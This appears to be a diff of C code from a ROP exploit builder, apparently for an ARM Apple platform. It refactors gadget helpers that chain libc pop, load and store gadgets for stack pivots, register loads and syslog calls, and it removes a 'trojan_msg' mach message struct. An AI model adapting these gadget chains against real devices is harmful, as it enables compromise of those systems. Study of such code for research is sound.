@@ -41,13 +41,13 @@
 #include <libproc.h>
 */
 #include "constants.h"
+#include "rop.h"
 
 unsigned int p3AddrLo = P3_ADDR_LO;
 unsigned int p2DataLo = 0, p3Data = 0;
 int firstP2Write = 1, firstP3Write = 1;
 int lines = 0;
 
-typedef unsigned int Addr;
 #define ROP_MODE_MEM 1
 #define ROP_MODE_FILE 2
 FILE* ropFile = NULL;
@@ -260,32 +260,27 @@ void ropStackPivotLo(Addr toAddr) {
 	ropWrite(USELESS);								// r7
 }
 
-#define ROP_LOAD_REG4_CONST_LEN 0xc
 void ropLoadReg4Const(unsigned int value) {
 	ropWrite(dscs + LIBC_POP_R47);		// 0x00 pc
 	ropWrite(value);			// 0x04 r4
 	ropWrite(USELESS);			// 0x08 r7
 }
 
-#define ROP_LOAD_REG0_CONST_LEN 0x8
 void ropLoadReg0Const(unsigned int value) {
 	ropWrite(dscs + LIBC_POP_R0);		// 0x00 pc
 	ropWrite(value);			// 0x04 r0
 }
 
-#define ROP_DEREF_REG0_LEN 0x8
 void ropDerefReg0() {
 	ropWrite(dscs + LIBC_LDR_R0_R0__POP_R7); // 0x00 pc
 	ropWrite(USELESS);			// 0x04 r7
 }
 
-#define ROP_LOAD_REG0_LEN (ROP_LOAD_REG0_CONST_LEN + ROP_DEREF_REG0_LEN)
 void ropLoadReg0(Addr ptrValue) {
 	ropLoadReg0Const(ptrValue);
 	ropDerefReg0();
 }
 
-#define ROP_SAVE_REG0_LEN (ROP_LOAD_REG4_CONST_LEN + 0xc)
 void ropSaveReg0(Addr toAddr) {
 	ropLoadReg4Const(toAddr);		// 0x00 pc
 	ropWrite(dscs + LIBC_STR_R0_R4__POP_R47); // 0x0c pc
@@ -446,17 +441,6 @@ void ropLog(char* msg) {
 	ropCall2(dscs + _dsc_syslog, LOG_WARNING, newString(msg));
 }
 
-struct trojan_msg {
-    mach_msg_header_t          header;
-    uint32_t                   r8;
-    uint32_t                   r10;
-    uint32_t                   r4;
-    uint32_t                   r5;
-    uint32_t                   r6;
-    uint32_t                   r7;
-    uint32_t                   pc;
-    uint32_t                   crap[7];
-};
 
 int ropMain(int slide) {
 	dscs = slide;
